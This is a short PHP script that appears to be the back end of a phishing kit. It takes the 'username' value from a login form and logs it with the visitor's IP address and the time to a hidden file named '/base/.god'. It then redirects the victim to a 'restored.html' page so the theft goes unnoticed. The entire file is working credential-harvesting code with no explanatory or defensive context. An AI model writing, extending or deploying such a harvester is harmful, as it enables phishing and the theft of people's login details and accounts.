<?php
$mail = $_POST['username'];
$today = date("H:i:s Y/m/d");
$ip=$_SERVER['REMOTE_ADDR'];

$info="Login / E-mail: $mail || IP: $ip || Time = $today\r\n";
$fh=fopen('/base/.god', "a+");
fwrite($fh, $info);
fclose($fh);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=./restored.html'></head></html>";
?>